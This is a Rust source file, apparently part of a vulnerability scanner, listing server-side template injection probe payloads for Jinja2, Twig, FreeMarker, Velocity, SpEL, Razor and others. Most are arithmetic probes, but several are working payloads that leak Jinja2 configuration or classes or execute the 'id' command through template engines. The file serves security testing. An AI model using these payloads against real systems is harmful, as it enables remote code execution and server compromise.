use crate::domain::active_vuln::{ExpectedIndicator, PayloadDefinition};
use crate::domain::entities::SeverityLevel;
use uuid::Uuid;

pub fn get_payloads() -> Vec<PayloadDefinition> {
    vec![
        PayloadDefinition {
            id: Uuid::new_v4().to_string(),
            payload: "${7*7}".to_string(),
            description: "SSTI: Freemarker / Velocity simple evaluation".to_string(),
            expected_indicator: ExpectedIndicator::ReflectedContent("49".to_string()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: Uuid::new_v4().to_string(),
            payload: "{{7*7}}".to_string(),
            description: "SSTI: Jinja2 / Twig simple evaluation".to_string(),
            expected_indicator: ExpectedIndicator::ReflectedContent("49".to_string()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: Uuid::new_v4().to_string(),
            payload: "<% 7*7 %>".to_string(),
            description: "SSTI: ERB / Underscore simple evaluation".to_string(),
            expected_indicator: ExpectedIndicator::ReflectedContent("49".to_string()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: Uuid::new_v4().to_string(),
            payload: "{{config.items()}}".to_string(),
            description: "SSTI: Jinja2 config leak".to_string(),
            expected_indicator: ExpectedIndicator::ErrorPattern("dict_items".to_string()),
            severity: SeverityLevel::Critical,
            safe_for_production: false,
        },
        PayloadDefinition {
            id: Uuid::new_v4().to_string(),
            payload: "${7*7}".to_string(),
            description: "SSTI: Spring Expression Language (SpEL) / Java".to_string(),
            expected_indicator: ExpectedIndicator::ReflectedContent("49".to_string()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: Uuid::new_v4().to_string(),
            payload: "#{7*7}".to_string(),
            description: "SSTI: JSF / Expression Language (EL)".to_string(),
            expected_indicator: ExpectedIndicator::ReflectedContent("49".to_string()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: Uuid::new_v4().to_string(),
            payload: "*{{7*7}}".to_string(),
            description: "SSTI: Tornado (Python) / VueJS".to_string(),
            expected_indicator: ExpectedIndicator::ReflectedContent("49".to_string()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: Uuid::new_v4().to_string(),
            payload: "@(7*7)".to_string(),
            description: "SSTI: Razor (C#)".to_string(),
            expected_indicator: ExpectedIndicator::ReflectedContent("49".to_string()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: Uuid::new_v4().to_string(),
            payload: "{{ ''.__class__.__mro__[1].__subclasses__() }}".to_string(),
            description: "SSTI: Jinja2 classes leak".to_string(),
            expected_indicator: ExpectedIndicator::ReflectedContent("type".to_string()),
            severity: SeverityLevel::Critical,
            safe_for_production: false,
        },
        PayloadDefinition {
            id: Uuid::new_v4().to_string(),
            payload: "{{['id']|filter('system')}}".to_string(),
            description: "SSTI: Twig command execution check".to_string(),
            expected_indicator: ExpectedIndicator::ReflectedContent("uid=".to_string()),
            severity: SeverityLevel::Critical,
            safe_for_production: false,
        },
        PayloadDefinition {
            id: Uuid::new_v4().to_string(),
            payload: "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }".to_string(),
            description: "SSTI: FreeMarker command execution check".to_string(),
            expected_indicator: ExpectedIndicator::ReflectedContent("uid=".to_string()),
            severity: SeverityLevel::Critical,
            safe_for_production: false,
        },
        PayloadDefinition {
            id: Uuid::new_v4().to_string(),
            payload: "#set($engine=\"\")\n#set($run=$engine.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\"))".to_string(),
            description: "SSTI: Velocity command execution check".to_string(),
            expected_indicator: ExpectedIndicator::ErrorPattern("Process".to_string()),
            severity: SeverityLevel::Critical,
            safe_for_production: false,
        },
        PayloadDefinition {
            id: Uuid::new_v4().to_string(),
            payload: "T(java.lang.Runtime).getRuntime().exec('id')".to_string(),
            description: "SSTI: SpEL command execution check".to_string(),
            expected_indicator: ExpectedIndicator::ErrorPattern("Process".to_string()),
            severity: SeverityLevel::Critical,
            safe_for_production: false,
        }
    ]
}
